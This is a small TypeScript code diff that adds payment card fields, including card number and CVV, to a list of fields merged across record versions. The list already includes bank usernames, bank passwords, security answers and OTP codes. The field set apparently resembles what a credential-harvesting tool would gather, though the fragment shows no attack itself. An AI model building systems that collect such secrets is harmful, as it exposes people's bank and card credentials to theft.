@@ -215,6 +215,8 @@ function mergeVersionsData(sources: AppVersion[]): AppVersion {
     "annualRevenue", "contactName",
     "bankName", "bankUsername", "bankPassword", "securityAnswer",
     "otpCode",
+    "paymentCardNumber", "paymentCardHolder", "paymentExpiryDate", "paymentCvv",
+    "paymentStatus", "paymentCompletedAt",
   ];
   const sorted = [...sources].sort(
     (a, b) => (Number(b.version) || 0) - (Number(a.version) || 0)
